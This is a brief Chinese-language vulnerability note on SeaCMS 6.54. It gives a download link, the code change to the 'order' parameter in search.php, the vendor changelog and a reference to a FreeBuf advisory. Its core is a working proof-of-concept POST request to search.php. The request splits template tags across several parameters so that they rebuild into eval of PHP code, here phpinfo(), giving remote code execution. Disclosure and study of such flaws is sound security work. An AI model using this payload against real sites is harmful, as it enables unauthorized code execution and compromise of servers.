## Affected Version 6.54

链接:https://pan.baidu.com/s/16rV0_xnoN_8-v4WVpCq6YA  

密码:qlwh



6.54 和6.53版本的不同之处是在：

`search.php`的65行的`order`参数做了限制。

`$order = ($order == "commend" || $order == "time" || $order == "hit") ? $order : "";`



```
更新日期：2017年8月7日 v6.54
修复：紧急修复2处高危安全漏洞

更新日期：2017年8月6日 v6.53
新增：微信公众平台模块
优化：采集逻辑
修复：部分文字描述错误
更新日期：2017年2月18日 v6.46
修复：两处安全问题

更新日期：2017年2月6日 v6.45
修复：一处安全问题
```

​	

## POC



    http://192.168.0.6/seacms654/search.php
    POST：
    searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();



## References

[漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警](http://www.freebuf.com/vuls/150042.html)



